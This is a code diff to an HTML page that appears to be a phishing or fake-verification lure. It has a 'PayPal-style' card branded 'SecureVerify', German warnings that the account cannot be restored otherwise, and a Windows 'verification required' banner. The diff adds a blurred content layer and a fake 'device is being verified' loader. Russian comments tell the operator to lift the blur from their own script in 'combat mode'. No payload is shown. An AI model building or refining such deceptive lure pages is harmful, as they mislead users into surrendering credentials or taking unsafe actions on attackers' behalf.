@@ -22,6 +22,8 @@
 
         /* ===== PayPal-style card ===== */
         .card {
+            position: relative;
+            overflow: hidden;
             width: min(480px, 100%);
             background: #ffffff;
             border: 1px solid #e3e6e8;
@@ -29,6 +31,29 @@
             box-shadow: 0 2px 10px rgba(0, 0, 0, .06);
             padding: 44px 40px 40px;
             text-align: center;
+        }
+
+        /* ===== Blur overlay ===== */
+        .content {
+            transition: filter .5s ease;
+        }
+        .content.blurred {
+            filter: blur(10px);
+            pointer-events: none;
+            user-select: none;
+        }
+        .overlay {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, .35);
+            transition: opacity .5s ease;
+        }
+        .overlay.hidden {
+            opacity: 0;
+            pointer-events: none;
         }
 
         .logo {
@@ -117,6 +142,7 @@
 </head>
 <body>
     <main class="card">
+        <div class="content blurred" id="pageContent">
         <div class="logo">Secure<span>Verify</span></div>
 
         <div class="icon" aria-hidden="true">
@@ -141,12 +167,27 @@
             <span>Andernfalls können wir Ihr Konto nicht wiederherstellen.</span>
         </div>
 
-        <div class="loader-wrap">
-            <div class="loader" role="status" aria-label="Wird geladen"></div>
-            <div class="loader-text">Gerät wird überprüft&nbsp;&hellip;</div>
+        <p class="foot">Windows 10 / 11 &middot; Verifizierung erforderlich</p>
         </div>
 
-        <p class="foot">Windows 10 / 11 &middot; Verifizierung erforderlich</p>
+        <div class="overlay" id="loaderOverlay">
+            <div class="loader-wrap">
+                <div class="loader" role="status" aria-label="Wird geladen"></div>
+                <div class="loader-text">Gerät wird überprüft&nbsp;&hellip;</div>
+            </div>
+        </div>
     </main>
+
+    <script>
+        // Снимает блюр, когда проверка завершена
+        function finishVerification() {
+            document.getElementById('pageContent').classList.remove('blurred');
+            document.getElementById('loaderOverlay').classList.add('hidden');
+        }
+        // Демо: снимает блюр через 6 секунд.
+        // В боевом режиме удалите setTimeout и вызывайте finishVerification()
+        // из своего скрипта, когда верификация реально завершится.
+        setTimeout(finishVerification, 6000);
+    </script>
 </body>
 </html>
